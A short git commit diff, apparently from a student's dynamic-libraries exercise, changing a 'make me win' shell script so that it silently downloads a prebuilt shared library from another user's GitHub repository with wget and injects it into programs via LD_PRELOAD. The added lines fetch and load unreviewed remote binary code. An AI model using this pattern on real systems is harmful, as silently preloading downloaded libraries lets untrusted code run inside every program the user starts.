5490153fd1690c1a343f1a7b526c7e5833412dcb
mebrie <mebrieka@gmail.com>
2022-07-11 11:18:13 -0700

    0x18-dynamic_libraries

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-gcc *.o -fPIC -shared -o libruin.so
-LD_PRELOAD=$PWD/libruin.so
+wget -q --output-document=$HOME/lib_inject.so https://github.com/Elmahdi1962/alx-low_level_programming/blob/master/0x18-dynamic_libraries/lib_inject.so?raw=true
+export LD_PRELOAD=$HOME/lib_inject.so
